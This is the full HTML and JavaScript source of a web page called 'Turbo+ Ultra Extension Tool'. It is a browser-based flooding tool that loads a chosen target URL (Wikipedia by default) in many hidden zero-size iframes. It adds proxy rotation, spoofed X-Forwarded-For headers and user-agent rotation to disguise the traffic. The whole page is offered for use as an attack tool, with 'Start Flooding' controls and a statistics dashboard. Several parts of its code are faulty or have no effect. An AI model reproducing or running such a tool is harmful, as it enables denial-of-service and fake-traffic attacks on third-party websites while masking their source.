<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Turbo+ Ultra Extension Tool</title>
  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <style>
    body {
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
      background: #000;
      color: #fff;
      overflow-x: hidden;
      height: 100vh;
    }
    h1 {
      text-align: center;
      color: #4CAF50;
      margin-top: 20px;
      font-size: 2em;
    }
    .container {
      width: 90%;
      max-width: 900px;
      margin: 0 auto;
      background: #333;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      box-sizing: border-box;
    }
    .container label {
      font-weight: bold;
      margin-top: 10px;
      display: block;
    }
    input, button, textarea, select {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      margin-top: 15px;
    }
    button.stop {
      background-color: #f44336;
    }
    button:hover {
      opacity: 0.9;
    }
    .status {
      text-align: center;
      font-weight: bold;
      color: #4CAF50;
      margin-top: 20px;
    }
    .error {
      color: #f44336;
      font-weight: bold;
    }
    #iframeContainer {
      display: none;
    }
    #dashboard {
      background-color: #f1f1f1;
      padding: 15px;
      border-radius: 5px;
      margin-top: 20px;
    }
    .stats {
      margin: 5px 0;
    }
    .stats span {
      font-weight: bold;
    }
    .tooltip {
      position: absolute;
      background-color: #f9f9f9;
      border: 1px solid #ccc;
      padding: 5px;
      font-size: 12px;
      display: none;
      border-radius: 4px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }
    .input-group {
      position: relative;
      margin-bottom: 15px;
    }
    .toggle-btn {
      background-color: #1f1f1f;
      color: #fff;
      border: 2px solid #4CAF50;
      cursor: pointer;
    }
    .toggle-btn.active {
      background-color: #4CAF50;
    }
    @media (max-width: 768px) {
      .container {
        width: 100%;
        padding: 15px;
      }
    }
  </style>
</head>
<body>

  <h1>Turbo+ Ultra Extension Tool</h1>

  <div class="container">
    <div class="input-group">
      <label for="targetUrl">Target URL:</label>
      <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
    </div>

    <div class="input-group">
      <label for="iframeCount">Number of Iframes:</label>
      <input type="number" id="iframeCount" value="50" min="1">
    </div>

    <div class="input-group">
      <label for="delay">Delay Between Iframes (seconds):</label>
      <input type="number" id="delay" value="1" min="0">
    </div>

    <div class="input-group">
      <label for="proxyList">Proxy List (comma separated):</label>
      <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
    </div>

    <div class="input-group">
      <label for="userAgentRotation">Enable User-Agent Rotation:</label>
      <input type="checkbox" id="userAgentRotation">
    </div>

    <div class="input-group">
      <label for="headers">Custom Headers (Optional):</label>
      <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>
    </div>

    <div class="input-group">
      <label for="autoStopTimer">Auto Stop Timer (seconds):</label>
      <input type="number" id="autoStopTimer" value="60" min="0">
    </div>

    <button onclick="startFlood()">Start Flooding</button>
    <button class="stop" onclick="stopFlood()">Stop Flooding</button>

    <div class="status" id="status">Ready</div>

    <div id="dashboard">
      <h3>Flooding Stats</h3>
      <p class="stats">Frames Generated: <span id="frameCount">0</span></p>
      <p class="stats">Failures: <span id="failureCount">0</span></p>
      <p class="stats">Current Target: <span id="currentTarget">None</span></p>
    </div>

    <button id="toggleBtn" class="toggle-btn">Switch to Turbo+ Ultra Mode</button>
  </div>

  <script>
    let flooding = false;
    let frameCount = 0;
    let failureCount = 0;
    let currentTarget = '';
    let proxyList = [];
    let userAgentRotation = false;
    let currentProxyIndex = 0;
    let turboUltraMode = false;

    // Start Flooding
    function startFlood() {
      if (flooding) return;
      flooding = true;
      document.getElementById('status').innerText = "Flooding in progress...";

      currentTarget = document.getElementById('targetUrl').value;
      proxyList = document.getElementById('proxyList').value.split(',');
      userAgentRotation = document.getElementById('userAgentRotation').checked;

      const customHeaders = document.getElementById('headers').value.split('\n').map(line => line.trim());
      const delay = parseInt(document.getElementById('delay').value) * 1000;

      floodIframes(currentTarget, delay, customHeaders);
    }

    function floodIframes(target, delay, customHeaders) {
      const iframeCount = parseInt(document.getElementById('iframeCount').value);
      for (let i = 0; i < iframeCount; i++) {
        setTimeout(() => {
          loadIframe(target, customHeaders);
          frameCount++;
          document.getElementById('frameCount').innerText = frameCount;
        }, delay * i);
      }

      const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
      if (autoStopTime > 0) {
        setTimeout(stopFlood, autoStopTime);
      }
    }

    // Load iframe with proxy and custom headers
    function loadIframe(target, customHeaders) {
      const iframe = document.createElement('iframe');
      iframe.src = target;
      iframe.style.width = "0";
      iframe.style.height = "0";
      iframe.style.border = "none";

      // Apply custom headers if provided
      customHeaders.forEach(header => {
        const [key, value] = header.split(':');
        if (key && value) {
          iframe.setAttribute('X-Forwarded-For', value.trim());
        }
      });

      // Proxy rotation and user-agent rotation
      let proxy = proxyList[currentProxyIndex % proxyList.length];
      if (userAgentRotation) {
        let randomUserAgent = getRandomUserAgent();
        iframe.setAttribute('User-Agent', randomUserAgent);
      }

      iframe.setAttribute('src', proxy + '/' + target);
      document.body.appendChild(iframe);
      currentProxyIndex++;
      document.getElementById('currentTarget').innerText = target;
    }

    // Get random User-Agent
    function getRandomUserAgent() {
      const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
      ];
      return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    // Stop Flood
    function stopFlood() {
      flooding = false;
      document.getElementById('status').innerText = "Flooding stopped.";
    }

    // Toggle Turbo+ Ultra Mode
    document.getElementById('toggleBtn').addEventListener('click', function() {
      turboUltraMode = !turboUltraMode;
      this.classList.toggle('active');
      this.innerText = turboUltraMode ? 'Switch to Normal Mode' : 'Switch to Turbo+ Ultra Mode';
    });
  </script>

</body>
</html>
